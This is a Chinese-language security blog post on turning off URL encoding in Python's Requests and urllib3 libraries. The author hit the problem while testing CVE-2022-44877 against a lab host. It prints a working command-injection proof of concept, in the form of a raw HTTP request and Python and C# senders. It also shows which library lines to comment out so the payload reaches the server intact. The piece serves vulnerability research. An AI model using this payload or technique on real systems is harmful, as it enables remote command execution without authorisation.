---
layout: post
title: Python开发技巧——禁用Requests库编码url
---


## 0x00 前言
---

我在使用Python Requests库发送HTTP数据包时，发现Requests库默认会对url进行编码。而在测试某些漏洞时，触发漏洞需要url的原始数据，禁用编码url的功能。本文将要介绍我的解决方法，记录研究细节。

## 0x01 简介
---

本文将要介绍以下内容：

- 测试环境
- 解决方法

## 0x02 测试环境
---

我在研究[CVE-2022-44877](https://github.com/numanturle/CVE-2022-44877)时遇到以下情况：

实现写文件的POC如下：

```
POST /login/index.php?login=$(touch${IFS}/tmp/pwned) HTTP/1.1
Host: 10.13.37.10:2031
Cookie: cwpsrv-2dbdc5905576590830494c54c04a1b01=6ahj1a6etv72ut1eaupietdk82
Content-Length: 40
Origin: https://10.13.37.10:2031
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: https://10.13.37.10:2031/login/index.php?login=failed
Accept-Encoding: gzip, deflate
Accept-Language: en
Connection: close

username=root&password=toor&commit=Login
```

根据POC我们可以写出对应的Python测试代码：

```
    headers = {
        "Cookie": "cwpsrv-7ed373abced7574da1245607e756e862=nfetkn56pkkdbqhht2hpl46bsa",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",      
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
    }

    proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
    }
    url = target_url + "/login/index.php?login=$(touch${IFS}/tmp/pwned)"
    data = "username=root&password=toor&commit=Login"
    response = requests.post(url=url,  headers=headers, data=data, verify=False, timeout=500, proxies=proxies)
    print(response.status_code)
```

为了便于测试，Python测试代码在发送POST数据时添加了代理，我们可以借助BurpSuite观察实际发送的内容，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2023-1-5/2-1.png)

我们可以发现，这里url做了编码，原始数据：`/login/index.php?login=$(touch${IFS}/tmp/pwned)`被编码成了`/login/index.php?login=$(touch$%7BIFS%7D/tmp/pwned)`，这会导致漏洞利用失败

## 0x03 解决方法
---

经过一些搜索，我没有找到公开的解决方法，于是决定查看Request库的细节，通过修改Request库的实现代码，去掉url编码的功能

Kali下Python Request库的代码位置为`/usr/lib/python3/dist-packages/requests/`，具体需要修改以下两个位置：

### 1.`/usr/lib/python3/dist-packages/requests/models.py`

在`/usr/lib/python3/dist-packages/requests/models.py`中的函数`def prepare_url(self, url, params)`，代码细节：

```
Line443:        url = requote_uri(urlunparse([scheme, netloc, path, None, query, fragment]))
```

查看`requote_uri()`的具体实现代码，位置：`/usr/lib/python3/dist-packages/requests/utils.py`，代码细节：

```
def requote_uri(uri):
    """Re-quote the given URI.

    This function passes the given URI through an unquote/quote cycle to
    ensure that it is fully and consistently quoted.

    :rtype: str
    """
    safe_with_percent = "!#$%&'()*+,/:;=?@[]~"
    safe_without_percent = "!#$&'()*+,/:;=?@[]~"
    try:
        # Unquote only the unreserved characters
        # Then quote only illegal characters (do not quote reserved,
        # unreserved, or '%')
        return quote(unquote_unreserved(uri), safe=safe_with_percent)
    except InvalidURL:
        # We couldn't unquote the given URI, so let's try quoting it, but
        # there may be unquoted '%'s in the URI. We need to make sure they're
        # properly quoted so they do not cause issues elsewhere.
        return quote(uri, safe=safe_without_percent)
```

这里调用了`quote()`将uri进行编码，`{`编码为`%7B`，`}`编码为`%7D`

#### 解决方法：

修改文件`/usr/lib/python3/dist-packages/requests/models.py`

注释掉`Line443: url = requote_uri(urlunparse([scheme, netloc, path, None, query, fragment]))`

### 2.`/usr/lib/python3/dist-packages/urllib3/connectionpool.py`

在`/usr/lib/python3/dist-packages/requests/adapters.py`中的函数`def send(self, request, stream=False, timeout=None, verify=True, cert=None, proxies=None)`，代码细节：

```
        try:
            if not chunked:
                resp = conn.urlopen(
                    method=request.method,
                    url=url,
                    body=request.body,
                    headers=request.headers,
                    redirect=False,
                    assert_same_host=False,
                    preload_content=False,
                    decode_content=False,
                    retries=self.max_retries,
                    timeout=timeout,
                )
```

查看`urlopen()`的具体实现代码，位置：`/usr/lib/python3/dist-packages/urllib3/connectionpool.py`，代码细节：

```
    def urlopen(
        self,
        method,
        url,
        body=None,
        headers=None,
        retries=None,
        redirect=True,
        assert_same_host=True,
        timeout=_Default,
        pool_timeout=None,
        release_conn=None,
        chunked=False,
        body_pos=None,
        **response_kw
    ):
        # Ensure that the URL we're connecting to is properly encoded
        if url.startswith("/"):
            url = six.ensure_str(_encode_target(url))
        else:
            url = six.ensure_str(parsed_url.url)
```

查看`_encode_target()`的具体实现代码，位置：`/usr/lib/python3/dist-packages/urllib3/util/url.py`，代码细节：

```
def _encode_target(target):
    """Percent-encodes a request target so that there are no invalid characters"""
    path, query = TARGET_RE.match(target).groups()
    target = _encode_invalid_chars(path, PATH_CHARS)
    query = _encode_invalid_chars(query, QUERY_CHARS)
    if query is not None:
        target += "?" + query
    return target
```

查看`parsed_url()`的具体实现代码，位置：`/usr/lib/python3/dist-packages/urllib3/util/url.py`，代码细节：

```
def parse_url(url):
        if normalize_uri and query:
            query = _encode_invalid_chars(query, QUERY_CHARS)
```

以上两部分最终均指向`_encode_invalid_chars()`，位置：`/usr/lib/python3/dist-packages/urllib3/util/url.py`，代码细节：

```
def _encode_invalid_chars(component, allowed_chars, encoding="utf-8"):
    """Percent-encodes a URI component without reapplying
    onto an already percent-encoded component.
    """
    if component is None:
        return component

    component = six.ensure_text(component)

    # Normalize existing percent-encoded bytes.
    # Try to see if the component we're encoding is already percent-encoded
    # so we can skip all '%' characters but still encode all others.
    component, percent_encodings = PERCENT_RE.subn(
        lambda match: match.group(0).upper(), component
    )

    uri_bytes = component.encode("utf-8", "surrogatepass")
    is_percent_encoded = percent_encodings == uri_bytes.count(b"%")
    encoded_component = bytearray()

    for i in range(0, len(uri_bytes)):
        # Will return a single character bytestring on both Python 2 & 3
        byte = uri_bytes[i : i + 1]
        byte_ord = ord(byte)
        if (is_percent_encoded and byte == b"%") or (
            byte_ord < 128 and byte.decode() in allowed_chars
        ):
            encoded_component += byte
            continue
        encoded_component.extend(b"%" + (hex(byte_ord)[2:].encode().zfill(2).upper()))

    return encoded_component.decode(encoding)
```

这里调用了`_encode_invalid_chars()`将url进行编码

#### 解决方法：

修改文件`/usr/lib/python3/dist-packages/urllib3/connectionpool.py`

去掉`urlopen()`中的以下代码：

```
Line649        if url.startswith("/"):
Line650            url = six.ensure_str(_encode_target(url))
Line651        else:
Line652            url = six.ensure_str(parsed_url.url)
```

再次借助BurpSuite观察实际发送的内容，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2023-1-5/2-2.png)

url未做编码，问题解决

## 0x04 解决方法2
---

这里还可以使用C Sharp实现发送POST数据，避免url编码，实现代码如下：

```
                String target = args[0] + "/login/index.php?login=$(touch${IFS}/tmp/pwned)";
                bool dontEscape = true;
                var url = new Uri(target, dontEscape);
                HttpWebRequest hwr = WebRequest.Create(url) as HttpWebRequest;
```

## 0x05 小结
---

本文介绍了通过修改Python Requests库禁用编码url的方法，也给出了C Sharp禁用编码url的实现代码，记录研究细节。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)


